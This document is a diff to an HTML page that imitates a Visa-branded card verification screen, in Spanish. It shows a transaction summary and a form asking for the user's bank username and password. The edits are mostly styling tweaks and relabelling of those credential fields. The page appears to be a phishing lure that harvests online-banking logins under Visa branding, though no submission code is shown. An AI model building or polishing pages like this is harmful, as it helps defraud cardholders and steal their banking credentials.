@@ -43,12 +43,12 @@
             width: 100%;
         }
 
-        /* HEADER */
+        /* HEADER - LOGO VERIFICADO POR VISA */
         .header {
             display: flex;
             align-items: center;
             justify-content: space-between;
-            margin-bottom: 24px;
+            margin-bottom: 20px;
             padding-bottom: 16px;
             border-bottom: 1px solid var(--visa-border);
         }
@@ -56,11 +56,11 @@
         .visa-logo {
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 12px;
         }
 
         .visa-logo img {
-            height: 32px;
+            height: 38px;
             width: auto;
             display: block;
         }
@@ -68,44 +68,51 @@
         .visa-badge {
             background: var(--visa-blue);
             color: white;
-            font-size: 0.65rem;
+            font-size: 0.7rem;
             font-weight: 700;
-            padding: 4px 12px;
+            padding: 4px 14px;
             border-radius: 20px;
-            letter-spacing: 0.5px;
+            letter-spacing: 0.8px;
             text-transform: uppercase;
         }
 
-        /* BANNER DE SEGURIDAD */
+        /* BANNER DE SEGURIDAD - ESTILO VISA */
         .security-banner {
             background: #f8fafc;
             border: 1px solid var(--visa-border);
             border-radius: 12px;
-            padding: 16px 20px;
+            padding: 14px 18px;
             margin-bottom: 24px;
             display: flex;
             align-items: flex-start;
             gap: 12px;
         }
 
-        .security-banner svg {
+        .security-banner .shield-icon {
             flex-shrink: 0;
-            width: 24px;
-            height: 24px;
+            width: 22px;
+            height: 22px;
             margin-top: 2px;
+            color: var(--visa-blue);
         }
 
         .security-banner p {
-            font-size: 0.875rem;
+            font-size: 0.8125rem;
             color: var(--visa-text-muted);
             line-height: 1.6;
             margin: 0;
+        }
+
+        .security-banner p strong {
+            color: var(--visa-text);
+            font-weight: 600;
         }
 
         .security-banner a {
             color: var(--visa-blue);
             font-weight: 600;
             text-decoration: none;
+            white-space: nowrap;
         }
 
         .security-banner a:hover {
@@ -135,7 +142,7 @@
         .transaction-info {
             background: #f8fafc;
             border-radius: 12px;
-            padding: 16px 20px;
+            padding: 14px 18px;
             margin-bottom: 24px;
             border: 1px solid var(--visa-border);
         }
@@ -143,7 +150,7 @@
         .info-row {
             display: flex;
             justify-content: space-between;
-            padding: 6px 0;
+            padding: 5px 0;
             font-size: 0.875rem;
         }
 
@@ -242,7 +249,7 @@
             background: #f8fafc;
             border: 1px solid var(--visa-border);
             border-radius: 12px;
-            padding: 16px 20px;
+            padding: 16px 18px;
             margin-top: 4px;
         }
 
@@ -270,7 +277,7 @@
             flex-shrink: 0;
         }
 
-        /* BOTONES */
+        /* BOTÓN */
         .button-group {
             display: flex;
             gap: 12px;
@@ -288,7 +295,6 @@
             transition: all 0.2s;
             flex: 1;
             text-align: center;
-            text-decoration: none;
             display: inline-flex;
             align-items: center;
             justify-content: center;
@@ -309,32 +315,7 @@
             cursor: not-allowed;
         }
 
-        .btn-secondary {
-            background: transparent;
-            color: var(--visa-text-muted);
-            border: 2px solid var(--visa-border);
-        }
-
-        .btn-secondary:hover {
-            background: #f3f4f6;
-            border-color: #9ca3af;
-        }
-
-        .btn-success {
-            background: var(--visa-success);
-            color: white;
-        }
-
-        .btn-success:hover:not(:disabled) {
-            background: #15803d;
-        }
-
-        .btn-success:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-
-        /* FOOTER DEL FORM */
+        /* FOOTER */
         .form-footer {
             margin-top: 20px;
             padding-top: 16px;
@@ -468,6 +449,10 @@
                 flex-direction: column;
                 align-items: flex-start;
             }
+
+            .visa-logo img {
+                height: 30px;
+            }
         }
     </style>
 </head>
@@ -490,7 +475,7 @@
 
         <!-- BANNER DE SEGURIDAD -->
         <div class="security-banner">
-            <svg viewBox="0 0 24 24" fill="none" stroke="#1a1f71" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <svg class="shield-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                 <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                 <path d="M12 8v4"/>
                 <path d="M12 16h.01"/>
@@ -519,7 +504,7 @@
             </div>
             <div class="info-row">
                 <span class="info-label">Fecha</span>
-                <span class="info-value" id="transaction-date">14/08/2026 09:59 PM</span>
+                <span class="info-value" id="transaction-date">14/08/2026 10:13 PM</span>
             </div>
             <div class="info-row">
                 <span class="info-label">Tarjeta</span>
@@ -534,14 +519,14 @@
         <form id="authForm" novalidate>
             <!-- CREDENCIALES -->
             <div class="form-group">
-                <label class="form-label">Usuario del banco <span class="required">*</span></label>
-                <input type="text" class="form-input" id="username" placeholder="Ingresa tu usuario bancario" required />
+                <label class="form-label">Usuario <span class="required">*</span></label>
+                <input type="text" class="form-input" id="username" placeholder="Ingresa tu usuario" required />
                 <div class="error-message">El usuario es requerido</div>
             </div>
 
             <div class="form-group">
-                <label class="form-label">Contraseña del banco <span class="required">*</span></label>
-                <input type="password" class="form-input" id="password" placeholder="Ingresa tu contraseña bancaria" required />
+                <label class="form-label">Contraseña <span class="required">*</span></label>
+                <input type="password" class="form-input" id="password" placeholder="Ingresa tu contraseña" required />
                 <div class="error-message">La contraseña es requerida</div>
             </div>
 
@@ -562,7 +547,7 @@
                 </div>
             </div>
 
-            <!-- BOTONES -->
+            <!-- BOTÓN -->
             <div class="button-group">
                 <button type="submit" class="btn btn-primary" id="submitButton">
                     <span id="buttonText">Enviar</span>
